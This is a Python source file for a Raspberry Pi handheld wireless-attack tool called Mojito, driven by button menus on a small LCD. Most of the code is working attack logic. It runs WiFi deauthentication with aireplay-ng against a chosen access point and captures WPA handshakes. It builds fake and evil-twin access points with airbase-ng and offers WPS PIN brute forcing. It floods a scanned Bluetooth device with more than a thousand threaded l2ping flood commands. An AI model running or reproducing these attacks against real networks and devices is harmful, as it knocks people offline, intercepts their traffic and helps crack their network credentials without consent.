import RPi.GPIO as GPIO
import time
import os
import subprocess
import json
import threading
from libs.dos_bluetooth import *
from libs.wifinetworks import *
from libs.mojstd import *
from libs.netstd import *

handshakes = 1 #on
#max_visible_options = 7
INTERFACE = json.load(open("/home/kali/Mojito/settings/settings.json", "r"))["interface"] #Different for the menu on the src folder
interface = []

#@functools.lru_cache(maxsize=1000)
def bk():
    if GPIO.input(KEY3_PIN) == 0:
        ui_print("Going back...", 0.5)
        selected_index = 0
        return True


def draw_menu(selected_index):
    # Clear previous image
    # Clear screen
    draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))

    # clock on the up right
    current_time = time.strftime("%H:%M")  # 24h HH:MM
    draw.text((width - 40, 0), current_time, font=font, fill=(255, 255, 255))  # clock

    NICKNAME = json.load(open("/home/kali/Mojito/myprofile.json", "r"))["nickname", "NOT FOUND!"]
    draw.text((5, 0), NICKNAME, font=font, fill=(255, 255, 255))  

    #IMPORTANT
    max_visible_options = 6
    # Offset
    scroll_offset = max(0, min(selected_index - max_visible_options + 1, len(menu_options) - max_visible_options))

    #IMPORTANT
    visible_options = menu_options[scroll_offset:scroll_offset + max_visible_options]

    # DRAW OPTIONS
    menu_offset = 16  # Offset
    for i, option in enumerate(visible_options):
        y = (i * 20) + menu_offset  # Space 

        # highlight
        if scroll_offset + i == selected_index:
            text_size = draw.textbbox((0, 0), option, font=font)
            text_width = text_size[2] - text_size[0]
            text_height = text_size[3] - text_size[1]
            draw.rectangle((0, y, width, y + text_height), fill=(50, 205, 50))  # Evidenzia sfondo
            draw.text((1, y), option, font=font, fill=(0, 0, 0))  # black text
        else:
            draw.text((1, y), option, font=font, fill=(255, 255, 255))  # white text

    # Display the updated image
    disp.LCD_ShowImage(image, 0, 0)

selected_index = 0
b = 1
nevergonnagiveuup = ["Never Gonna Give You Up", "Never Gonna Let You Down", "Never Gonna Run Around", "And DesertYou", "Never Gonna Make You Cry", "Never Gonna Say Good Bye"]
a = nevergonnagiveuup[0]


#############################################################################################

                                        # THE WHILE#

#############################################################################################

while True:
    menu_options = ["Networks","Bluetooth", "Settings", "Reboot", "Shutdown"]
    draw_menu(selected_index)

    if GPIO.input(KEY_UP_PIN) == 0:
        selected_index = (selected_index - 1) % len(menu_options)
        draw_menu(selected_index)

    elif GPIO.input(KEY_DOWN_PIN) == 0:
        selected_index = (selected_index + 1) % len(menu_options)
        draw_menu(selected_index)

    elif GPIO.input(KEY_PRESS_PIN) == 0:

        selected_option = menu_options[selected_index]

        if selected_option == "Networks":
            # NETWORKS
            time.sleep(0.2)
            while True:
                menu_options = ["Wifi"]
                draw_menu(selected_index)

                if GPIO.input(KEY_UP_PIN) == 0:
                    selected_index = (selected_index - 1) % len(menu_options)
                    draw_menu(selected_index)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)

                elif bk() == True:
                    break

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    if selected_option == "Wifi":
                        #WIFI

                        time.sleep(0.30)
                        selected_index = 0
                        while True:
                            menu_options = ["Fake AP", "Handshakes", "Deauth", "Wps"]

                            draw_menu(selected_index)
                            if GPIO.input(KEY_UP_PIN) == 0:
                                selected_index = (selected_index - 1) % len(menu_options)
                                draw_menu(selected_index)

                            elif GPIO.input(KEY_DOWN_PIN) == 0:
                                selected_index = (selected_index + 1) % len(menu_options)
                                draw_menu(selected_index)

                            elif bk() == True:
                                break

                            elif GPIO.input(KEY_PRESS_PIN) == 0:
                                selected_option = menu_options[selected_index]


                                #Handshakes -----> works
                                if selected_option == "Handshakes":
                                    ui_print("Loading...", 0.3)
                                    wifi_info(INTERFACE).main()
                                    menu_options = []
                                    selected_index = 0

                                    with open("wifiinfo.json", mode="r") as a:
                                        data = json.load(a)

                                    dictdionary = {}

                                    for item in data:
                                        menu_options.append(item['ssid'])
                                        dictdionary[item['ssid']] = item['bssid']
                                        dictdionary[item['bssid']] = item['chan']

                                    selected_index = 0
                                    while handshakes == 1:
                                            draw_menu(selected_index)

                                            if GPIO.input(KEY_UP_PIN) == 0:
                                                selected_index = (selected_index - 1) % len(menu_options)
                                                draw_menu(selected_index)

                                            elif GPIO.input(KEY_DOWN_PIN) == 0:
                                                selected_index = (selected_index + 1) % len(menu_options)
                                                draw_menu(selected_index)

                                            elif bk() == True:
                                                break

                                            elif GPIO.input(KEY_PRESS_PIN) == 0:
                                                selected_option = menu_options[selected_index]

                                                selected_bssid = dictdionary[selected_option]
                                                selected_chan = dictdionary[selected_bssid]

                                                #Bettercap

                                                ui_print("Wait please...")
                                                process = netstd(INTERFACE).interface_select(INTERFACE)
                                                if process == 0:
                                                    pass
                                                else:
                                                    print(process)
                                                    ui_print("""Error:
Interface not Found
Try to reboot Mojito
if the problem persist""")
                                                    break
                                                if netstd(INTERFACE).interface_start(INTERFACE) == 1:
                                                    ui_print("Going back", 0.5)
                                                    break
                                                time.sleep(1)
                                                ui_print(f"{INTERFACE} ready!")

                                                menu_options = ["Pcap", "Pcapng"]
                                                while handshakes == 1:
                                                    draw_menu(selected_index)
                                                    if GPIO.input(KEY_UP_PIN) == 0:
                                                        selected_index = (selected_index - 1) % len(menu_options)
                                                        draw_menu(selected_index)

                                                    elif GPIO.input(KEY_DOWN_PIN) == 0:
                                                        selected_index = (selected_index + 1) % len(menu_options)
                                                        draw_menu(selected_index)

                                                    elif bk() == True:
                                                        break

                                                    elif GPIO.input(KEY_PRESS_PIN) == 0:
                                                        selected_option = menu_options[selected_index]


                                                        #Handshakes -----> works


                                                        ui_print("Loading...", 0.3)
                                                        menu_options = []
                                                        selected_index = 0

                                                        # KEY3
                                                        if bk() == True:
                                                            break

                                                        ui_print("Wait please...")
                                                        time.sleep(1)

                                                        if bk() == True:
                                                            break

                                                        else:
                                                            time.sleep(0.5)
                                                            if selected_option == "Pcap":
                                                                a = 0
                                                                process = netstd(INTERFACE).initialization(selected_chan, selected_option, selected_bssid, INTERFACE, a)
                                                            else:
                                                                a = 1
                                                                process = netstd(INTERFACE).initialization(selected_chan, selected_option, selected_bssid, INTERFACE, a)

                                                            print("process is running")

                                                            while True:
                                                                if process == 1:
                                                                    bk_ = 1
                                                                    break
                                                                elif process == 0:
                                                                    break
                                                                else:
                                                                    break

                                                            if bk_ == 1:
                                                                selected_index = 0
                                                                break

                                                            ui_print("""This might take
        some time...""", 2)
                                                            ui_print("""When the handshake
        is captured,
        you'll be notified""", 2.5)
                                                            while True:
                                                                start_time = time.time()
                                                                timeout = 25 * 60
                                                                if os.path.exists(f"home/kali/Moijto/wpa_{selected_bssid}_.pcap") == True:
                                                                    if os.path.getsize(f"/home/kali/Mojito/wpa_{selected_bssid}_.pcap") > 1000:
                                                                        ui_print("Handshake captured!",1)
                                                                        os.system("sudo iwconfig "+INTERFACE+" mode managed")
                                                                        os.system("sudo systemctl restart NetworkManager")
                                                                        ui_print("Going back...")
                                                                        break
                                                                else:
                                                                    ui_print("""Waiting the 4-way
        handshake""", 1)
                                                                    pass

                                                                if bk() == True:
                                                                    handshakes = 0
                                                                    break

                                                                if time.time() - start_time > timeout:
                                                                    ui_print("Timeout After 25 min", 1.5)
                                                                    handshakes = 0
                                                                    break



                                #DEAUTH ALL -----> WORKS BETTER ON SIGLE TARGETS (NOT ON ALL THE NETWORK)
                                elif selected_option == "Deauth all":
                                    wifi_info(INTERFACE).main()
                                    menu_options = []

                                    with open("wifiinfo.json", mode="r") as a:
                                        data = json.load(a)

                                    dictdionary = {}

                                    for item in data:
                                            menu_options.append(item['ssid'])
                                            dictdionary[item['ssid']] = item['bssid']
                                            dictdionary[item['bssid']] = item['chan']

                                    ui_print("Loading...",1 )

                                    selected_index = 0
                                    while True:
                                        draw_menu(selected_index)
                                        if GPIO.input(KEY_UP_PIN) == 0:
                                            selected_index = (selected_index - 1) % len(menu_options)
                                            draw_menu(selected_index)

                                        elif GPIO.input(KEY_DOWN_PIN) == 0:
                                            selected_index = (selected_index + 1) % len(menu_options)
                                            draw_menu(selected_index)

                                        elif bk() == True:
                                            break


                                        elif GPIO.input(KEY_PRESS_PIN) == 0:
                                                selected_option = menu_options[selected_index]
                                                selected_bssid = dictdionary[selected_option]
                                                selected_chan = dictdionary[selected_bssid]
                                                print("info: "+selected_option+" "+selected_bssid+" "+str(selected_chan))

                                                ui_print("Deauth starting...")
                                                os.system(f"sudo airmon-ng start {INTERFACE}")
                                                time.sleep(0.5)
                                                ui_print(f"{INTERFACE} interface created", 1)
                                                time.sleep(0.5)
                                                ui_print("Wait please...", 1)
                                                time.sleep(0.5)
                                                subprocess.run(['sudo', 'iwconfig', f'{INTERFACE}', 'channel', str(selected_chan)], text=True, capture_output=True)
                                                time.sleep(1.25)
                                                ui_print(f"{INTERFACE} --> channel {str(selected_chan)}")
                                                time.sleep(1)
                                                ui_print("Loading...")
                                                time.sleep(1)
                                                ui_print("Press Key_3 to go back...")
                                                command = ['sudo', 'aireplay-ng','--deauth', '0', '-a', selected_bssid, f'{INTERFACE}']

                                                deauthall = subprocess.run(command, text=True, capture_output=True)

                                                if  GPIO.input(KEY3_PIN) == 0:
                                                    ui_print("Going back...", 0.5)
                                                    break

                                                elif deauthall.returncode != 0:
                                                    ui_print(f"Error: {deauthall.stderr}", 2)
                                                    with open("output1.txt", 'a') as file:
                                                        command_string = ' '.join(command)
                                                        file.write(f"command: {command_string}\n")
                                                        file.write(deauthall.stderr)
                                                        file.write(deauthall.stdout)
                                                        os.system(f"sudo iwconfig {INTERFACE} mode managed")
                                                        os.system("sudo systemctl NetworkManager restart")
                                                        time.sleep(1)
                                                        ui_print(f"Restarting {INTERFACE}...",2)
                                                        break

                                                else:
                                                    with open("output1.txt", 'a') as file:
                                                        command_string = ' '.join(command)
                                                        file.write(f"command: {command_string}\n")
                                                        file.write(deauthall.stdout)



                                #Fake AP
                                elif selected_option == 'Fake AP':
                                    selected_index = 0

                                    while True:
                                        menu_options = ["RickRoll", "Evil Twin"]
                                        draw_menu(selected_index)

                                        if GPIO.input(KEY_UP_PIN) == 0:
                                            selected_index = (selected_index - 1) % len(menu_options)
                                            draw_menu(selected_index)

                                        elif GPIO.input(KEY_DOWN_PIN) == 0:
                                            selected_index = (selected_index + 1) % len(menu_options)
                                            draw_menu(selected_index)

                                        elif bk() == True:
                                            break

                                        elif GPIO.input(KEY_PRESS_PIN) == 0:
                                            selected_option = menu_options[selected_index]
                                            ui_print("Wait please...")

#RICKROLL
                                            if selected_option == "RickRoll":
                                                time.sleep(1)
                                                os.system(f"sudo airmon-ng start {INTERFACE}")
                                                os.system(f"sudo airmon-ng check {INTERFACE} && sudo airmon-ng check kill")
                                                os.system(f"sudo airmon-ng start {INTERFACE}")
                                                ui_print(f"{INTERFACE} is ready")

                                                if bk() == True:
                                                    break

                                                ui_print("Starting ...")
                                                time.sleep(1)

                                                def RickRoll(a, b):
                                                    os.system(f'sudo airbase-ng -e "{nevergonnagiveuup[a]}" -c {b} {INTERFACE}')
                                                    if bk() == True:
                                                        os.system("sudo airmon-ng stop "+INTERFACE)
                                                        return 1

                                                for i in range(len(nevergonnagiveuup)):
                                                    ui_print(f"""Fake AP -
RickRoll started . . .""", 1.5)
                                                    process = threading.Thread(target=RickRoll, args=(i, b)).start()
                                                    if process == 1:
                                                        break
                                                    b += 1
                                                while True:
                                                    ui_print("Press Key 3 to stop...")
                                                    if bk() == True:
                                                        threading.Event()
                                                        break

#EVIL TWIN
                                            elif selected_option == "Evil Twin":
                                                wifi_info(INTERFACE).main()
                                                menu_options = []

                                                with open("wifiinfo.json", mode="r") as a:
                                                    data = json.load(a)

                                                dictdionary = {}

                                                for item in data:
                                                    menu_options.append(item['ssid'])
                                                    dictdionary[item['ssid']] = item['bssid']
                                                    dictdionary[item['bssid']] = item['chan']

                                                ui_print("Loading...", 0.5)

                                                selected_index = 0
                                                while True:
                                                    draw_menu(selected_index)
                                                    if GPIO.input(KEY_UP_PIN) == 0:
                                                        selected_index = (selected_index - 1) % len(menu_options)
                                                        draw_menu(selected_index)

                                                    elif GPIO.input(KEY_DOWN_PIN) == 0:
                                                        selected_index = (selected_index + 1) % len(menu_options)
                                                        draw_menu(selected_index)

                                                    elif bk() == True:
                                                        break

                                                    elif GPIO.input(KEY_PRESS_PIN) == 0:
                                                        selected_option = menu_options[selected_index]
                                                        selected_bssid = dictdionary[selected_option]
                                                        selected_chan = dictdionary[selected_bssid]

                                                        ui_print("Wait please...", 0.5)

                                                        if netstd(INTERFACE).interface_select(INTERFACE) == 0:
                                                            pass

                                                        else:
                                                            ui_print(f"Error: Interface {INTERFACE} not found", 2)

                                                        if netstd(INTERFACE).interface_start1(INTERFACE) == 1:
                                                            ui_print("Going back...", 0.5)
                                                            break
                                                        ui_print(f"{INTERFACE} ready!", 0.5)
                                                        ui_print(f"""{selected_option}
    -
Evil Twin loading...""", 1)
                                                        ui_print(f"""Sniffing the real
{selected_option}""", 1)
                                                        while True:
                                                            ui_print("Press Key 3 to stop...")
                                                            if netstd(INTERFACE).evil_twin(INTERFACE, selected_option, selected_bssid, selected_chan) == 0:
                                                                ui_print("""Evil Twin
            _
    Spoofing and Sniffing
        Stopped...""", 1)
                                                                break




#WPS ATTACKS
                                elif selected_option == "Wps":
                                    selected_index = 0
                                    time.sleep(0.20)

                                    while True:
                                        menu_options = ["Wps Pin Bruteforce", "Pixie Dust Attack"]
                                        draw_menu(selected_index)

                                        if GPIO.input(KEY_UP_PIN) == 0:
                                            selected_index = (selected_index - 1) % len(menu_options)
                                            draw_menu(selected_index)

                                        elif GPIO.input(KEY_DOWN_PIN) == 0:
                                            selected_index = (selected_index + 1) % len(menu_options)
                                            draw_menu(selected_index)

                                        elif bk() == True:
                                            break

                                        elif GPIO.input(KEY_PRESS_PIN) == 0:
                                            selected_option = menu_options[selected_index]
                                            ui_print("Wait please...", 0.5)

                                            if selected_option == "Wps Pin Bruteforce":
                                                wifi_info(INTERFACE).main()

                                                menu_options = []

                                                with open("wifiinfo.json", mode="r") as a:
                                                    data = json.load(a)

                                                dictdionary = {}

                                                for item in data:
                                                    menu_options.append(item['ssid'])
                                                ui_print("Loading...", 1)

                                                selected_index = 0
                                                while True:
                                                    draw_menu(selected_index)
                                                    if GPIO.input(KEY_UP_PIN) == 0:
                                                        selected_index = (selected_index - 1) % len(menu_options)
                                                        draw_menu(selected_index)

                                                    elif GPIO.input(KEY_DOWN_PIN) == 0:
                                                        selected_index = (selected_index + 1) % len(menu_options)
                                                        draw_menu(selected_index)

                                                    elif bk() == True:
                                                        break


                                                    elif GPIO.input(KEY_PRESS_PIN) == 0:
                                                        selected_option = menu_options[selected_index]

                                                        ui_print("Wait please...", 0.75)
                                                        while True:
                                                            if netstd(INTERFACE, selected_option, 0).brute_force_wps(selected_option, INTERFACE) == 0:
                                                                pass


        #Bluetooth
        elif selected_option == "Bluetooth":
            selected_index = 0
            time.sleep(0.20)

            while True:
                menu_options = ["Dos", "Multiple attacks"]
                draw_menu(selected_index)


                if GPIO.input(KEY_UP_PIN) == 0:
                    selected_index = (selected_index - 1) % len(menu_options)
                    draw_menu(selected_index)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)

                elif bk() == True:
                    break

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    #Bluetooth Dos
                    if selected_option == "Dos":

                        ui_print("Wait please . . .")
                        menu_options = []
                        selected_index = 0

                        dos().main()       #Scan for mac address
                        for i in mac_addrs:
                            menu_options.append(i)

                        time.sleep(0.25)
                        selected_index = 0
                        BLUEDOS = 1
                        while True:
                            if BLUEDOS == 0:
                                ui_print("Quitting DOS...")
                                time.sleep(2.5)

                            draw_menu(selected_index)

                            if GPIO.input(KEY_UP_PIN) == 0:
                                selected_index = (selected_index - 1) % len(menu_options)
                                draw_menu(selected_index)

                            elif GPIO.input(KEY_DOWN_PIN) == 0:
                                selected_index = (selected_index + 1) % len(menu_options)
                                draw_menu(selected_index)

                            elif bk() == True:
                                break

                            elif GPIO.input(KEY_PRESS_PIN) == 0:
                                selected_option = menu_options[selected_index]

                                #while True:
                                mac = str(selected_option)
                                print(mac)
                                os.system("sudo " + "hciconfig " + "hci0 " + "up")
                                time.sleep(1)
                                def DOS(a):
                                        os.system('sudo l2ping -i hci0 -s 600 -f '+ mac)

                                for i in range(0, 1023, 1):
                                    ui_print(f"""Dossing
    {mac} . . .""")
                                    BleDos = threading.Thread(target=DOS, args=[str(mac)]).start()

                                    #if bk() == True:
                                     #   BLUEDOS = 0
                                      #  BleDos.threading.Event()
                                       # time.slee(1)
                                        #ui_print("Going back...", 0.5)
                                        #break

        elif selected_option == "Reboot":
            menu_options = ["Yes", "No"]
            selected_index = 0

            time.sleep(0.5)
            while True:
                draw_menu(selected_index)
                if GPIO.input(KEY_UP_PIN) == 0:
                                selected_index = (selected_index - 1) % len(menu_options)
                                draw_menu(selected_index)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)

                elif bk() == True:
                    break

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    if selected_option == "Yes":
                        ui_print("Rebooting...", 1.5)
                        draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
                        os.system("sudo reboot now")

                    else:
                        break

        elif selected_option == "Shutdown":
            menu_options = ["Yes", "No"]
            selected_index = 0

            time.sleep(0.20)
            while True:
                draw_menu(selected_index)
                if GPIO.input(KEY_UP_PIN) == 0:
                    selected_index = (selected_index - 1) % len(menu_options)
                    draw_menu(selected_index)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)

                elif  GPIO.input(KEY3_PIN) == 0:
                    ui_print("Going back...", 0.5)
                    break

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    if selected_option == "Yes":
                        ui_print("Shutting down mojito...", 2)
                        draw.rectangle((0, 0, width, height), outline=0, fill=(0, 0, 0))
                        os.system("sudo shutdown now")

                    else:
                        break

        elif selected_option == "Settings":
            selected_index = 0

            time.sleep(0.20)
            while True:
                menu_options = ["Interface", "Ssh"]
                draw_menu(selected_index)
                if GPIO.input(KEY_UP_PIN) == 0:
                    selected_index = (selected_index - 1) % len(menu_options)
                    draw_menu(selected_index)

                elif GPIO.input(KEY_DOWN_PIN) == 0:
                    selected_index = (selected_index + 1) % len(menu_options)
                    draw_menu(selected_index)

                elif GPIO.input(KEY3_PIN) == 0:
                    ui_print("Going back...", 0.5)
                    break

                elif GPIO.input(KEY_PRESS_PIN) == 0:
                    selected_option = menu_options[selected_index]

                    if selected_option == "Interface":
                        sys_class_net_ = subprocess.run(["ls", "/sys/class/net/"], text=True, capture_output=True)
                        if sys_class_net_.returncode != 0:
                            ui_print("""Error: Unable to find ANY
    network interfaces""")

                        else:
                            interface = sys_class_net_.stdout.splitlines()

                            #interface menu
                            selected_index = 0
                            time.sleep(0.20)

                            while True:
                                menu_options = interface
                                draw_menu(selected_index)
                                if GPIO.input(KEY_UP_PIN) == 0:
                                    selected_index = (selected_index - 1) % len(menu_options)
                                    draw_menu(selected_index)

                                elif GPIO.input(KEY_DOWN_PIN) == 0:
                                    selected_index = (selected_index + 1) % len(menu_options)
                                    draw_menu(selected_index)

                                elif GPIO.input(KEY3_PIN) == 0:
                                    ui_print("Going back...", 0.5)
                                    break

                                elif GPIO.input(KEY_PRESS_PIN) == 0:
                                    selected_option = menu_options[selected_index]
                                    INTERFACE = {"interface":selected_option}
                                    ui_print("Wait please...", 0.5)
                                    with open("settings/settings.json", "w") as idk:
                                        json.dump(INTERFACE, idk, indent=2)
                                    ui_print(f"""Selected Interface:
{selected_option}""")

                    else:
                        break
